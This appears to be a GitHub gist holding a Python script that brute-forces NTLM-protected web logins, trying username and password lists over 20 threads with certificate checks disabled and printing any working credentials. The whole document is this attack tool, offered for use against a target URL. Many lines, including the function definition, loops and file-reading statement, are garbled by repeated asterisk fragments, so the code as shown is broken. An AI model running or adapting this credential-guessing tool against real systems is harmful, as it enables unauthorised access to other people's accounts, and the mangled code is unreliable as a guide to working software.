#date: 2025-03-28T17:05:11Z
#url: https://api.github.com/gists/05901b661746138d6891fc8637e39c1e
#owner: https://api.github.com/users/Ademking

# Usage: "**********"://example.com users.txt passwords.txt

import requests
from requests_ntlm import HttpNtlmAuth
import urllib3
import argparse
import concurrent.futures

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

 "**********"d "**********"e "**********"f "**********"  "**********"b "**********"r "**********"u "**********"t "**********"e "**********"_ "**********"f "**********"o "**********"r "**********"c "**********"e "**********"_ "**********"n "**********"t "**********"l "**********"m "**********"( "**********"u "**********"r "**********"l "**********", "**********"  "**********"u "**********"s "**********"e "**********"r "**********"n "**********"a "**********"m "**********"e "**********", "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********") "**********": "**********"
    response = "**********"=HttpNtlmAuth(username, password), verify=False)
    if response.status_code == 200:
        print(f"[+] Success: "**********":{password}")
        return (username, password)
    elif response.status_code == 401:
        print(".", end="", flush=True)  # Show dots for failed attempts
    else:
        print(f"[!] Unexpected response: {response.status_code}")
    return None

def run_bruteforce(url, user_list, pass_list):
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for username in user_list:
 "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"  "**********"f "**********"o "**********"r "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"  "**********"i "**********"n "**********"  "**********"p "**********"a "**********"s "**********"s "**********"_ "**********"l "**********"i "**********"s "**********"t "**********": "**********"
                futures.append(executor.submit(brute_force_ntlm, url, username, password))

        # Wait for all threads to finish
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result

    print("\n[-] No valid credentials found.")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NTLM Brute Force Script")
    parser.add_argument("url", help="Target NTLM-protected URL")
    parser.add_argument("username_file", help="Path to username list")
    parser.add_argument("password_file", help= "**********"
    args = parser.parse_args()

 "**********"  "**********"  "**********"  "**********"  "**********"w "**********"i "**********"t "**********"h "**********"  "**********"o "**********"p "**********"e "**********"n "**********"( "**********"a "**********"r "**********"g "**********"s "**********". "**********"u "**********"s "**********"e "**********"r "**********"n "**********"a "**********"m "**********"e "**********"_ "**********"f "**********"i "**********"l "**********"e "**********", "**********"  "**********"" "**********"r "**********"" "**********") "**********"  "**********"a "**********"s "**********"  "**********"u "**********"s "**********"e "**********"r "**********"s "**********", "**********"  "**********"o "**********"p "**********"e "**********"n "**********"( "**********"a "**********"r "**********"g "**********"s "**********". "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"_ "**********"f "**********"i "**********"l "**********"e "**********", "**********"  "**********"" "**********"r "**********"" "**********") "**********"  "**********"a "**********"s "**********"  "**********"p "**********"a "**********"s "**********"s "**********"w "**********"o "**********"r "**********"d "**********"s "**********": "**********"
        user_list = users.read().splitlines()
        pass_list = "**********"

    run_bruteforce(args.url, user_list, pass_list)